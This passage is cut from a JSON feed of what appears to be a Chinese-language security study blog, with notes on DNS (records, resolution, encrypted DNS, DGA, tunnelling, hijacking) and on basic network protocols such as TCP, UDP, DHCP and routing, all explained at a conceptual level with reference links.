WebSocket Subprotocol Name Registry</span></li>\n</ul>\n<h2 id=\"blog\"><a class=\"anchor\" href=\"#blog\">#</a> Blog</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzIwMTUuemVyb25pZ2h0cy5vcmcvYXNzZXRzL2ZpbGVzLzM1LUVnb3Jvdi5wZGY=\">What should a hacker know about WebDav</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTkvMDkvY29va2llLXNhbWVzaXRlLmh0bWw=\">Cookie 的 SameSite 属性</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTYvMDgvaHR0cC5odG1s\">HTTP 协议入门</span></li>\n</ul>\n",
            "tags": [
                "HTTP"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/DNS/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/DNS/",
            "title": "域名系统",
            "date_published": "2022-11-25T02:06:09.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>DNS 是一个简单的请求 - 响应协议，是将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS 使用 TCP 和 UDP 协议的 53 端口。</p>\n<h1 id=\"请求响应\"><a class=\"anchor\" href=\"#请求响应\">#</a> 请求响应</h1>\n<h2 id=\"dns记录\"><a class=\"anchor\" href=\"#dns记录\">#</a> DNS 记录</h2>\n<ul>\n<li>\n<p>A</p>\n<ul>\n<li>返回域名对应的 IPv4 地址</li>\n</ul>\n</li>\n<li>\n<p>AAAA</p>\n</li>\n<li>\n<p>NS</p>\n<ul>\n<li>\n<p>域名服务器</p>\n</li>\n<li>\n<p>返回该域名由哪台域名服务器解析</p>\n</li>\n</ul>\n</li>\n<li>\n<p>PTR</p>\n<ul>\n<li>反向记录</li>\n<li>从 IP 地址到域名的记录</li>\n</ul>\n</li>\n<li>\n<p>MX</p>\n<ul>\n<li>电子邮件交换记录</li>\n<li>记录邮件域名对应的 IP 地址</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"响应码\"><a class=\"anchor\" href=\"#响应码\">#</a> 响应码</h2>\n<ul>\n<li>NOERROR</li>\n</ul>\n<pre><code>No error condition\n</code></pre>\n<ul>\n<li>FORMERR</li>\n</ul>\n<pre><code>Format error - The name server was unable to interpret the query\n</code></pre>\n<ul>\n<li>SERVFAIL</li>\n</ul>\n<pre><code>Server failure - The name server was unable to process this query due to a problem with the name server\n</code></pre>\n<ul>\n<li>NXDOMAIN</li>\n</ul>\n<pre><code>this code signifies that the domain name referenced in the query does not exist\n</code></pre>\n<ul>\n<li>NOTIMP</li>\n</ul>\n<pre><code>Not Implemented - The name server does not support the requested kind of query\n</code></pre>\n<ul>\n<li>REFUSED</li>\n</ul>\n<pre><code>Refused - The name server refuses to perform the specified operation for policy reasons\n</code></pre>\n<ul>\n<li>NODATA</li>\n</ul>\n<pre><code>A pseudo RCODE which indicates that the name is valid, for the given class, but [there] are no records of the given type A NODATA response has to be inferred from the answer.\n</code></pre>\n<h1 id=\"域名系统工作原理\"><a class=\"anchor\" href=\"#域名系统工作原理\">#</a> 域名系统工作原理</h1>\n<h2 id=\"解析过程\"><a class=\"anchor\" href=\"#解析过程\">#</a> 解析过程</h2>\n<p>DNS 解析过程是递归查询的，具体过程如下：</p>\n<ul>\n<li>用户要访问域名 www.example.com 时，先查看本机 hosts 是否有记录或者本机是否有 DNS 缓存，如果有，直接返回结果，否则向递归服务器查询该域名的 IP 地址</li>\n<li>递归缓存为空时，首先向根服务器查询 com 顶级域的 IP 地址</li>\n<li>根服务器告知递归服务器 com 顶级域名服务器的 IP 地址</li>\n<li>递归向 com 顶级域名服务器查询负责 example.com 的权威服务器的 IP</li>\n<li>com 顶级域名服务器返回相应的 IP 地址</li>\n<li>递归向 example.com 的权威服务器查询 www.example.com 的地址记录</li>\n<li>权威服务器告知 www.example.com 的地址记录</li>\n<li>递归服务器将查询结果返回客户端</li>\n</ul>\n<h2 id=\"域传送\"><a class=\"anchor\" href=\"#域传送\">#</a> 域传送</h2>\n<p>DNS 服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。域传送是在主备服务器之间同步数据库的机制。</p>\n<h1 id=\"服务器类型\"><a class=\"anchor\" href=\"#服务器类型\">#</a> 服务器类型</h1>\n<h2 id=\"根服务器\"><a class=\"anchor\" href=\"#根服务器\">#</a> 根服务器</h2>\n<p>根服务器是 DNS 的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将 DNS 查询引导到相应的域名服务器。</p>\n<p>根服务器在域名树中代表最顶级的  <code>.</code>  域， 一般省略。</p>\n<p>13 台 IPv4 根服务器的域名标号为 a 到 m，即 <span class=\"exturl\" data-url=\"aHR0cDovL2Eucm9vdC1zZXJ2ZXJzLm9yZw==\">a.root-servers.org</span> 到 <span class=\"exturl\" data-url=\"aHR0cDovL20ucm9vdC1zZXJ2ZXJzLm9yZw==\">m.root-servers.org</span>，所有服务器存储的数据相同，仅包含 ICANN 批准的 TLD 域名权威信息。</p>\n<h2 id=\"权威服务器\"><a class=\"anchor\" href=\"#权威服务器\">#</a> 权威服务器</h2>\n<p>权威服务器上存储域名 Zone 文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得 DNS 查询的资源记录。</p>\n<p>权威服务器需要在所承载的域名所属的 TLD 管理局注册，同一个权威服务器可以承载不同 TLD 域名，同一个域也可以有多个权威服务器。</p>\n<h2 id=\"递归服务器\"><a class=\"anchor\" href=\"#递归服务器\">#</a> 递归服务器</h2>\n<p>递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的 Hint 文件。</p>\n<h1 id=\"加密方案\"><a class=\"anchor\" href=\"#加密方案\">#</a> 加密方案</h1>\n<p>作为主流的防御方案，DNS 加密有五种方案，分别是 DNS-over-TLS (DoT)、DNS-over-DTLS、DNS-over-HTTPS (DoH)、DNS-over-QUIC 以及 DNSCrypt。</p>\n<h2 id=\"dot\"><a class=\"anchor\" href=\"#dot\">#</a> DoT</h2>\n<p>DoT 方案在 2016 年发表于 RFC7858，使用 853 端口。主要思想是 Client 和 Server 通过 TCP 协议建立 TLS 会话后再进行 DNS 传输，Client 通过 SSL 证书验证服务器身份。</p>\n<h2 id=\"dns-over-dtls\"><a class=\"anchor\" href=\"#dns-over-dtls\">#</a> DNS-over-DTLS</h2>\n<p>DNS-over-DTLS 和 DoT 类似，区别在于使用 UDP 协议而不是 TCP 协议。</p>\n<h2 id=\"doh\"><a class=\"anchor\" href=\"#doh\">#</a> DoH</h2>\n<p>DoH 方案在发表 RFC8484，使用  <code>https://dns.example.com/dns-query&#123;?dns&#125;</code>  来查询服务器的 IP，复用 https 的 443 端口，流量特征比较小。DoH 会对 DNS 服务器进行加密认证，不提供 fallback 选项。目前 Cloudflare、Google 等服务商对 DoH 提供了支持。</p>\n<h2 id=\"dns-over-quic\"><a class=\"anchor\" href=\"#dns-over-quic\">#</a> DNS-over-QUIC</h2>\n<p>DNS-over-QUIC 安全特性和 DoT 类似，但是性能更高，目前没有合适的软件实现。</p>\n<h2 id=\"dnscrypt\"><a class=\"anchor\" href=\"#dnscrypt\">#</a> DNSCrypt</h2>\n<p>DNSCrypt 使用 X25519-XSalsa20Poly1305 而非标准的 TLS，且 DNSCrypt 的 Client 需要额外的软件，Server 需要的专门的证书。</p>\n<h1 id=\"dns利用\"><a class=\"anchor\" href=\"#dns利用\">#</a> DNS 利用</h1>\n<h2 id=\"dga\"><a class=\"anchor\" href=\"#dga\">#</a> DGA</h2>\n<p>DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成 C&amp;C 域名，从而逃避域名黑名单检测的技术手段，常见于 botnet 中。一般来说，一个 DGA 域名的存活时间约在 1-7 天左右。</p>\n<p>通信时，客户端和服务端都运行同一套 DGA 算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变 IP 技术，快速变换 IP，从而域名和 IP 都可以进行快速变化。</p>\n<p>DGA 域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。</p>\n<h2 id=\"dns隧道\"><a class=\"anchor\" href=\"#dns隧道\">#</a> DNS 隧道</h2>\n<p>DNS 隧道工具将进入隧道的其他协议流量封装到 DNS 协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。</p>\n<h1 id=\"rdap\"><a class=\"anchor\" href=\"#rdap\">#</a> RDAP</h1>\n<p>RDAP (Registration Data Access Protocol) 协议是 Whois 协议的后继，和 Whois 协议类似，RDAP 协议提供了域名、自治系统、IP 地址的信息查询。</p>\n<h1 id=\"相关漏洞\"><a class=\"anchor\" href=\"#相关漏洞\">#</a> 相关漏洞</h1>\n<h2 id=\"dns劫持\"><a class=\"anchor\" href=\"#dns劫持\">#</a> DNS 劫持</h2>\n<p>DNS 劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造 DNS 响应的方法，来将域名解析到恶意的 IP 地址。</p>\n<p>随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。</p>\n<h2 id=\"拒绝服务\"><a class=\"anchor\" href=\"#拒绝服务\">#</a> 拒绝服务</h2>\n<p>DNS 服务通常会开启 UDP 端口，当 DNS 服务器拥有大量二级域 NS 记录时，通过 DNS 的 UDP 反射攻击可以实现高倍的拒绝服务。</p>\n<h1 id=\"相关机构\"><a class=\"anchor\" href=\"#相关机构\">#</a> 相关机构</h1>\n<h2 id=\"icann\"><a class=\"anchor\" href=\"#icann\">#</a> ICANN</h2>\n<p>互联网名称与数字地址分配机构 (Internet Corporation for Assigned Names and Numbers, ICANN) 创建于 1998 年 9 月 18 日，职能包括管理域名和 IP 地址的分配等与互联网相关的任务。</p>\n<h2 id=\"iana\"><a class=\"anchor\" href=\"#iana\">#</a> IANA</h2>\n<p>互联网号码分配局 (Internet Assigned Numbers Authority, IANA) ，是一家互联网地址指派机构，管理国际互联网中使用的 IP 地址、域名和许多其它参数的机构。</p>\n<h1 id=\"术语\"><a class=\"anchor\" href=\"#术语\">#</a> 术语</h1>\n<h2 id=\"mdns\"><a class=\"anchor\" href=\"#mdns\">#</a> mDNS</h2>\n<p>Multicast DNS (mDNS)，多播 DNS，使用 5353 端口，组播地址为  <code>224.0.0.251</code>  或  <code>[FF02::FB]</code>  。在一个没有常规 DNS 服务器的小型网络内可以使用 mDNS 来实现类似 DNS 的编程接口、包格式和操作语义。mDNS 协议的报文与 DNS 的报文结构相同，但有些字段对于 mDNS 来说有新的含义。</p>\n<p>启动 mDNS 的主机会在进入局域网后向所有主机组播消息，包含主机名、IP 等信息，其他拥有相应服务的主机也会响应含有主机名和 IP 的信息。</p>\n<p>mDNS 的域名是用  <code>.local</code>  和普通域名区分开的。</p>\n<h2 id=\"fqdn\"><a class=\"anchor\" href=\"#fqdn\">#</a> FQDN</h2>\n<p>FQDN (Fully-Qualified Domain Name) 是域名的完全形态，主要是包含零长度的根标签，例如  <code>www.example.com.</code>  。</p>\n<h2 id=\"tld\"><a class=\"anchor\" href=\"#tld\">#</a> TLD</h2>\n<p>Top-Level Domain (TLD) 是属于根域的一个域，例如  <code>com</code>  或  <code>jp</code>  。</p>\n<p>TLD 一般可以分为 Country Code Top-Level Domains (ccTLDs) 、Generic Top-Level Domains (gTLDs) 以及其它。</p>\n<h2 id=\"idn\"><a class=\"anchor\" href=\"#idn\">#</a> IDN</h2>\n<p>Internationalized Domain Names for Applications (IDNA) 是为了处理非 ASCII 字符的情况。</p>\n<h2 id=\"cname\"><a class=\"anchor\" href=\"#cname\">#</a> CNAME</h2>\n<p>CNAME 即 Canonical name，又称 alias，将域名指向另一个域名。</p>\n<h2 id=\"ttl\"><a class=\"anchor\" href=\"#ttl\">#</a> TTL</h2>\n<p>Time To Live，无符号整数，记录 DNS 记录过期的时间，最小是 0，最大是 2147483647 (2^31 - 1)。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"rfc\"><a class=\"anchor\" href=\"#rfc\">#</a> RFC</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzkyMA==\">RFC 920 Domain Requirements</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzEwMzQ=\">RFC 1034 DOMAIN NAMES CONCEPTS AND FACILITIES</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzEwMzU=\">RFC 1035 DOMAIN NAMES IMPLEMENTATION AND SPECIFICATION</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzExMjM=\">RFC 1123 Requirements for Internet Hosts -- Application and Support</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI1MzU=\">RFC 2535 Domain Name System Security Extensions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI5MzA=\">RFC 2930 Secret Key Establishment for DNS (TKEY RR)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI5MzE=\">RFC 2931 DNS Request and Transaction Signatures ( SIG(0)s )</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM1OTY=\">RFC 3596 Legacy Resolver Compatibility for Delegation Signer (DS)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM3NTU=\">RFC 3755 DNS Extensions to Support IP Version 6</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUwMDE=\">RFC 5001 Automated Updates of DNS Security (DNSSEC) Trust Anchors</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzU5MzY=\">RFC 5936 DNS Zone Transfer Protocol</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzU5NjY=\">RFC 5966 DNS Transport over TCP - Implementation Requirements</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYzNzY=\">RFC 6376 DomainKeys Identified Mail (DKIM) Signatures</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzY3NjI=\">RFC 6762 Multicast DNS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzY4OTE=\">RFC 6891 Extension Mechanisms for DNS (EDNS(0))</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzY4OTU=\">RFC 6895 DNS IANA Considerations</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc3NjY=\">RFC 7766 DNS Transport over TCP - Implementation Requirements</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc4NTg=\">RFC 7858 Specification for DNS over Transport Layer Security (TLS)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc4NzE=\">RFC 7871 Client Subnet in DNS Queries</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgwODI=\">RFC 8082 NXDOMAIN</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0ODI=\">RFC 8482 Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0ODQ=\">RFC 8484 DNS Queries over HTTPS (DoH)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0OTA=\">RFC 8490 DNS Stateful Operations</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0OTk=\">RFC 8499 DNS Terminology</span></li>\n</ul>\n<h3 id=\"whois-相关\"><a class=\"anchor\" href=\"#whois-相关\">#</a> Whois 相关</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgxMg==\">RFC 812 NICNAME/WHOIS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzk1NA==\">RFC 954 NICNAME/WHOIS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzIxNjc=\">RFC 2167 Referral Whois (RWhois) Protocol V1.5</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM5MTI=\">RFC 3912 WHOIS Protocol Specification</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODU=\">RFC 7485 Inventory and Analysis of WHOIS Registration Objects</span></li>\n</ul>\n<h3 id=\"rdap-相关\"><a class=\"anchor\" href=\"#rdap-相关\">#</a> RDAP 相关</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODA=\">RFC7480 HTTP Usage in the Registration Data Access Protocol (RDAP)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODE=\">RFC7481 Security Services for the Registration Data Access Protocol (RDAP)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODQ=\">RFC7484 Finding the Authoritative Registration Data (RDAP) Service</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgwNTY=\">RFC8056 Registration Data Access Protocol (RDAP) Object Tagging</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzkwODI=\">RFC9082 Registration Data Access Protocol (RDAP) Query Format</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzkwODM=\">RFC9083 JSON Responses for the Registration Data Access Protocol (RDAP)</span></li>\n</ul>\n<h2 id=\"相关标准\"><a class=\"anchor\" href=\"#相关标准\">#</a> 相关标准</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hYm91dC5yZGFwLm9yZy8=\">Registration Data Access Protocol (RDAP)</span></li>\n</ul>\n<h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05MbmV0TGFicy91bmJvdW5k\">Unbound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2lzYy1wcm9qZWN0cy9iaW5kOQ==\">bind9</span></li>\n</ul>\n<h2 id=\"研究文章\"><a class=\"anchor\" href=\"#研究文章\">#</a> 研究文章</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MveGJmMFFicHBrOFIwbng4OVBiNFlUZw==\">DGA 域名的今生前世：缘起、检测、与发展</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnRoZWNqdy5tZS8/cD0xMjIx\">DNSSEC 原理和分析</span></li>\n<li>Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.</li>\n<li>An End-to-End Large-Scale Measurement of DNS-over-Encryption: How Far Have We Come?</li>\n</ul>\n<h2 id=\"相关cve\"><a class=\"anchor\" href=\"#相关cve\">#</a> 相关 CVE</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXNlYXJjaC5jaGVja3BvaW50LmNvbS8yMDIwL3Jlc29sdmluZy15b3VyLXdheS1pbnRvLWRvbWFpbi1hZG1pbi1leHBsb2l0aW5nLWEtMTcteWVhci1vbGQtYnVnLWluLXdpbmRvd3MtZG5zLXNlcnZlcnMv\">SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers</span></li>\n</ul>\n",
            "tags": [
                "域名",
                "DNS",
                "WEB"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/protocol/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/protocol/",
            "title": "网络协议",
            "date_published": "2022-11-24T03:16:26.000Z",
            "content_html": "<h1 id=\"udp协议\"><a class=\"anchor\" href=\"#udp协议\">#</a> UDP 协议</h1>\n<h2 id=\"主要特点\"><a class=\"anchor\" href=\"#主要特点\">#</a> 主要特点</h2>\n<ul>\n<li>协议开销小、效率高。</li>\n<li>UDP 是无连接的，即发送数据之前不需要建立连接。</li>\n<li>UDP 使用尽最大努力交付，即不保证可靠交付。</li>\n<li>UDP 没有拥塞控制。</li>\n<li>UDP 支持一对一、一对多、多对一和多对多交互通信。</li>\n<li>UDP 的首部开销小，只有 8 个字节。</li>\n</ul>\n<h1 id=\"tcp协议\"><a class=\"anchor\" href=\"#tcp协议\">#</a> TCP 协议</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由 RFC 793 定义。</p>\n<h2 id=\"三次握手\"><a class=\"anchor\" href=\"#三次握手\">#</a> 三次握手</h2>\n<p>三次握手（Three-Way Handshake）是指建立一个 TCP 连接时，需要客户端和服务端总共发送 3 个包以确认连接的建立。</p>\n<p>第一次握手客户端将标志位 SYN 置为 1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。</p>\n<p>第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 和 ACK 都置为 1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。</p>\n<p>第三次握手客户端收到确认后，检查 ack 值是否为 s+1，ACK 标志位是否为 1，如果正确则将标志位 ACK 置为 1，ack=k+1，并将该数据包发送给服务端，服务端检查 ack 值是否为 k+1，ACK 标志位是否为 1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手。</p>\n<h2 id=\"四次挥手\"><a class=\"anchor\" href=\"#四次挥手\">#</a> 四次挥手</h2>\n<p>四次挥手（Four-Way Wavehand）指断开一个 TCP 连接时，需要客户端和服务端总共发送 4 个包以确认连接的断开。</p>\n<p>第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。</p>\n<p>第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号 + 1，服务端进入 CLOSE_WAIT 状态。</p>\n<p>第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。</p>\n<p>第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号 + 1，服务端进入 CLOSED 状态，完成四次挥手。</p>\n<h2 id=\"拥塞控制\"><a class=\"anchor\" href=\"#拥塞控制\">#</a> 拥塞控制</h2>\n<p>拥塞是指网络中报文数量过多，使得服务端来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿即出现死锁现象。</p>\n<p>TCP 采用拥塞控制算法来减少或者避免拥塞现象的发生，TCP 的拥塞算法有过多种实现，包括 Tahoe、Reno、NewReno、Vegas、Hybla、BIC 、CUBIC、SACK、Westwood、PRR、BBR 等。</p>\n<h1 id=\"dhcp协议\"><a class=\"anchor\" href=\"#dhcp协议\">#</a> DHCP 协议</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于 OSI 模型的应用层，使用 UDP 协议工作，主要用于自动分配 IP 地址给用户，方便管理员进行统一管理。</p>\n<p>DHCP 服务器端使用 67/udp，客户端使用 68/udp。DHCP 运行分为四个基本过程，分别为请求 IP 租约、提供 IP 租约、选择 IP 租约和确认 IP 租约。客户端在获得了一个 IP 地址以后，就可以发送一个 ARP 请求来避免由于 DHCP 服务器地址池重叠而引发的 IP 冲突。</p>\n<h2 id=\"dhcp报文格式\"><a class=\"anchor\" href=\"#dhcp报文格式\">#</a> DHCP 报文格式</h2>\n<pre><code>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|     op (1)    |   htype (1)   |   hlen (1)    |   hops (1)    |\n+---------------+---------------+---------------+---------------+\n|                            xid (4)                            |\n+-------------------------------+-------------------------------+\n|           secs (2)            |           flags (2)           |\n+-------------------------------+-------------------------------+\n|                          ciaddr  (4)                          |\n+---------------------------------------------------------------+\n|                          yiaddr  (4)                          |\n+---------------------------------------------------------------+\n|                          siaddr  (4)                          |\n+---------------------------------------------------------------+\n|                          giaddr  (4)                          |\n+---------------------------------------------------------------+\n|                          chaddr  (16)                         |\n+---------------------------------------------------------------+\n|                          sname   (64)                         |\n+---------------------------------------------------------------+\n|                          file    (128)                        |\n+---------------------------------------------------------------+\n|                          options (variable)                   |\n+---------------------------------------------------------------+\n</code></pre>\n<h1 id=\"路由算法\"><a class=\"anchor\" href=\"#路由算法\">#</a> 路由算法</h1>\n<h2 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h2>\n<p>路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。</p>\n<h2 id=\"路由选择算法的功能\"><a class=\"anchor\" href=\"#路由选择算法的功能\">#</a> 路由选择算法的功能</h2>\n<p>源 / 宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。</p>\n<p>路由选择算法的要求：</p>\n<ul>\n<li>正确性：确保分组从源节点传送到目的节点</li>\n<li>简单性：实现方便，软硬件开销小</li>\n<li>自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化</li>\n<li>稳定性：能长时间无故障运行</li>\n<li>公平性：每个节点都有机会传送信息</li>\n<li>最优性：尽量选取好的路由</li>\n</ul>\n<h2 id=\"自治系统autonomous-system\"><a class=\"anchor\" href=\"#自治系统autonomous-system\">#</a> 自治系统（Autonomous System）</h2>\n<p>经典定义：</p>\n<ul>\n<li>由一个组织管理的一整套路由器和网络。</li>\n<li>使用一种 AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。</li>\n<li>使用一种 AS 之间的路由选择协议用以确定分组在 AS 之间的路由。</li>\n</ul>\n<p>尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。</p>\n<h2 id=\"rip\"><a class=\"anchor\" href=\"#rip\">#</a> RIP</h2>\n<p>路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离 向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。</p>\n<h2 id=\"ospf\"><a class=\"anchor\" href=\"#ospf\">#</a> OSPF</h2>\n<p>开放最短路径优先 (Open Shortest Path First，OSPF)，这个算法名为 “最短路径优先” 是因为使用了 Dijkstra 提出的最短路径算法 SPF，只是一个协议的名字，它并不表示其他的路由选择协议不是 “最短路径优先”。</p>\n",
            "tags": [
                "计算机网络",
                "网络协议"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/netw/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/netw/",
            "title": "计算机网络基础",
            "date_published": "2022-11-24T02:45:44.000Z",
